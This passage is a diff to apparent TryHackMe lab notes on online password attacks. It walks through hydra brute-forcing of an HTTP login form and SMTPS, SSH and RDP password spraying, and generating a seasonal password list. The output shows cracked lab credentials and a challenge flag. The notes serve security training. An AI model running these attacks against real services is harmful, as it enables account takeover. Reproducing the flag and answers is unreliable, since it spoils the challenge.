@@ -1131,6 +1131,61 @@ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
 
 ```
 
+**HTTP Login Pages**
+
+In this scenario, we will brute-force HTTP login pages. To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST. Checking hydra options: hydra http-get-form -U, we can see that hydra has the following syntax for the http-get-form option:
+
+` <url>:<form parameters>:<condition string>[:<optional>[:<optional>] `
+
+As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite.
+
+```bash
+user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task 
+[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php 
+[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx 
+1 of 1 target successfully completed, 1 valid password found 
+Hydra (http://www.thc.org/thc-hydra) 
+finished at 2021-10-13 08:06:45
+```
+
+-l admin  we are specifying a single username, use-L for a username wordlist
+
+-P Path specifying the full path of wordlist, you can specify a single password by using -p.
+
+10.10.x.x the IP address or the fully qualified domain name (FQDN) of the target.
+
+http-get-form the type of HTTP request, which can be either http-get-form or http-post-form.
+
+Next, we specify the URL, path, and conditions that are split using :
+
+login-get/index.php the path of the login page on the target webserver.
+
+username=^USER^&password=^PASS^ the parameters to brute-force, we inject ^USER^ to brute force usernames and ^PASS^ for passwords from the specified dictionary.
+
+The following section is important to eliminate false positives by specifying the 'failed' condition with F=.
+
+And success conditions, S=. You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage 'Invalid password' after a failed login, set F=Invalid Password.
+
+Or for example, during the enumeration, we found that the webserver serves logout.php. After logging into the login page with valid credentials, we could guess that we will have logout.php somewhere on the page. Therefore, we could tell hydra to look for the text logout.php within the HTML for every request.
+
+S=logout.php the success condition to identify the valid credentials
+
+-f to stop the brute-forcing attacks after finding a valid username and password
+
+You can try it out on the attached VM by visiting http://10.10.98.196/login-get/index.php. Make sure to deploy the attached VM if you haven't already to answer the questions below.
+
+Finally, it is worth it to check other online password attacks tools to expand your knowledge, such as:
+
+- Medusa
+- Ncrack
+- others!
+
+
+
 **TASKS**
 In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against 10.10.131.9:465 (SMTPS).
 
@@ -1297,12 +1352,222 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-22 12:42:
 
 ```
 
+2nd attempt
 ```bash
-rhost=10.10.98.196
 kali=10.10.70.157
 
+rhost=10.10.98.196
+wordlist=dict.lst
+user=pittman@clinic.thmredteam.com
+hydra -l $user -P $wordlist smtps://$rhost -s 465 -v
 
 
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-26 11:55:27
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 5250 login tries (l:1/p:5250), ~329 tries per task
+[DATA] attacking smtps://10.10.98.196:465/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[465][smtp] host: 10.10.98.196   login: pittman@clinic.thmredteam.com   password: !multidisciplinary00
+[STATUS] attack finished for 10.10.98.196 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-26 11:55:45
 
 ```
+
+
+**Perform a brute-forcing attack against the phillips account for the login page at http://10.10.98.196/login-get using hydra? What is the flag?**
+```bash
+
+rhost=10.10.98.196
+hydra -l phillips -P clinic_wordlist.txt $rhost http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
+
+
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-26 12:06:10
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:1/p:105), ~7 tries per task
+[DATA] attacking http-get-form://10.10.98.196:80/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php
+[80][http-get-form] host: 10.10.98.196   login: phillips   password: Paracetamol
+[STATUS] attack finished for 10.10.98.196 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-26 12:06:10
+
+```
+> THM{33c5d4954da881814420f3ba39772644}
+
+
+## Password Spray Attack
+
+This task will teach the fundamentals of a password spraying attack and the tools needed to perform various attack scenarios against common online services.
+
+Password Spraying is an effective technique used to identify valid credentials. Nowadays, password spraying is considered one of the common password attacks for discovering weak passwords. This technique can be used against various online services and authentication systems, such as SSH, SMB, RDP, SMTP, Outlook Web Application, etc. A brute-force attack targets a specific username to try many weak and predictable passwords. While a password spraying attack targets many usernames using one common weak password, which could help avoid an account lockout policy. The following figure explains the concept of password spraying attacks where the attacker utilizes one common password against multiple users.
+
+![0](./media/33-password-spray.png)
+
+Common and weak passwords often follow a pattern and format. Some commonly used passwords and their overall format can be found below.
+
+- The current season followed by the current year (SeasonYear). For example, Fall2020, Spring2021, etc.
+- The current month followed by the current year (MonthYear). For example, November2020, March2021, etc.
+- Using the company name along with random numbers (CompanyNameNumbers). For example, TryHackMe01, TryHackMe02.
+
+
+If a password complexity policy is enforced within the organization, we may need to create a password that includes symbols to fulfill the requirement, such as October2021!, Spring2021!, October2021@, etc. To be successful in the password spraying attack, we need to enumerate the target and create a list of valid usernames (or email addresses list).
+
+Next, we will apply the password spraying technique using different scenarios against various services, including:
+
+- SSH
+- RDP
+- Outlook web access (OWA) portal
+- SMB
+
+**SSH**
+```
+user@THM:~# cat usernames-list.txt
+admin
+victim
+dummy
+adm
+sammy
+```
+Here we can use hydra to perform the password spraying attack against the SSH service using the Spring2021 password.
+
+```
+user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
+[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
+[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
+[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+```
+Note that L is to load the list of valid usernames, and -p uses the Spring2021 password against the SSH service at 10.1.1.10. The above output shows that we have successfully found credentials.
+
+
+**RDP**
+Let's assume that we found an exposed RDP service on port 3026. We can use a tool such as RDPassSpray to password spray against RDP. First, install the tool on your attacking machine by following the installation instructions in the tool’s GitHub repo. As a new user of this tool, we will start by executing the python3 RDPassSpray.py -h command to see how the tools can be used:
+> https://github.com/xFreed0m/RDPassSpray
+```bash
+user@THM:~# python3 RDPassSpray.py -h
+usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -U USERLIST, --userlist USERLIST
+                        Users list to use, one user per line
+  -u USER, --user USER  Single user to use
+  -p PASSWORD, --password PASSWORD
+                        Single password to use
+  -P PASSWORDLIST, --passwordlist PASSWORDLIST
+                        Password list to use, one password per line
+  -T TARGETLIST, --targetlist TARGETLIST
+                        Targets list to use, one target per line
+  -t TARGET, --target TARGET
+                        Target machine to authenticate against
+  -s SLEEP, --sleep SLEEP
+                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
+  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
+                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
+  -d DOMAIN, --domain DOMAIN
+                        Domain name to use
+  -n NAMES, --names NAMES
+                        Hostnames list to use as the source hostnames, one per line
+  -o OUTPUT, --output OUTPUT
+                        Output each attempt result to a csv file
+  -V, --verbose         Turn on verbosity to show failed attempts
+```
+
+Now, let's try using the (-u) option to specify the victim as a username and the (-p) option set the Spring2021!. The (-t) option is to select a single host to attack.
+
+```bash
+user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
+[13-02-2021 16:47] - Total number of users to test: 1
+[13-02-2021 16:47] - Total number of password to test: 1
+[13-02-2021 16:47] - Total number of attempts: 1
+[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
+[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
+
+```
+The above output shows that we successfully found valid credentials victim:Spring2021!. Note that we can specify a domain name using the -d option if we are in an Active Directory environment.
+
+```bash
+user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
+```
+There are various tools that perform a spraying password attack against different services, such as:
+
+
+**Outlook web access (OWA) portal** 
+
+Tools:
+- https://github.com/xFreed0m/RDPassSpray
+- https://github.com/byt3bl33d3r/SprayingToolkit
+ 
+**SMB**
+Tool: Metasploit (auxiliary/scanner/smb/smb_login)
+
+PRACTICAL
+Use the following username list:
+
+```bash
+user@THM:~# cat usernames-list.txt 
+admin
+phillips
+burgess
+pittman
+guess
+```
+Perform a password spraying attack to get access to the SSH://10.10.98.196 server to read /etc/flag. What is the flag?
+
+```bash
+# Generate password list
+for year in {2020..2021}; do 
+    for char in '!' '@' '#' '$' '%' '^' '&' '*' '(' ')'; do 
+        echo "Fall${year}${char}"
+    done
+done > passwords.txt
+
+└─# cat passwords.txt 
+Fall2020!
+Fall2020@
+Fall2020#
+Fall2020$
+Fall2020%
+Fall2020^
+Fall2020&
+Fall2020*
+Fall2020(
+Fall2020)
+Fall2021!
+Fall2021@
+Fall2021#
+Fall2021$
+Fall2021%
+Fall2021^
+Fall2021&
+Fall2021*
+Fall2021(
+Fall2021)
+
+rhost=10.10.98.196
+hydra -L usernames.txt -P passwords.txt ssh://$rhost -t 4
+
+```
+ 
+
+
